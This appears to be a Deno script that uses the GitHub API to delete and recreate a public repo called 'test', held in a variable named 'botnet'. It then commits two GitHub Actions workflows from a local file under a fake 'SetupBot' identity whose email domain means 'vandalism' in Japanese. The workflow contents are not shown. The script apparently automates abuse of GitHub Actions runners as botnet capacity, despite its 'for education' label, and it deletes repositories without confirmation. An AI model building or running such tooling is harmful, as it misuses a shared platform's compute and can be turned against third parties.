import { Octokit, App } from "https://esm.sh/octokit?dts";
import "https://deno.land/x/dotenv@v3.2.0/load.ts";

const { TOKEN } = Deno.env.toObject();

const octokit = new Octokit({
  auth: TOKEN,
});
const myName = await octokit.rest.users.getAuthenticated();
const myOwner = myName.data.login;

// already exist
if ((await octokit.rest.repos.get({
  owner: myOwner,
  repo: "test",
})).status === 200) {
  console.log("[!] Already forked");
  await octokit.rest.repos.delete({
    owner: myOwner,
    repo: "test",
  })
  console.log("[!] Delete and re-fork");
}


const botnet = await octokit.rest.repos.createForAuthenticatedUser({
  name: "test",
  private: false,
  description: "for education",
});

console.log("[!] Created");

const afterOwner = botnet.data.owner.login;
const afterRepo = botnet.data.name;

const array = Array.from({ length: 2 }).fill(0).map(async (_v, i) => {
    console.log("[!] Create reg-" + i);
    const workflow = await octokit.rest.repos.createOrUpdateFileContents({
        owner: afterOwner,
        repo: afterRepo,
        path: ".github/workflows/entry" + i + ".yml",
        message: "setup",
        content: btoa(await Deno.readTextFile("./objects/index.yml")),
        committer: {
          name: `SetupBot`,
          email: "amex@荒らし.com",
        },
        author: {
          name: "SetupBot",
          email: "amex@荒らし.com",
        },
    });

    return workflow.data.content?.path
})

console.log("[!] Writed Action");

console.log("[!] Start setup");

// run workflow

array.forEach(async (_v, i) => {
    console.log("[!] Run " + await _v);
})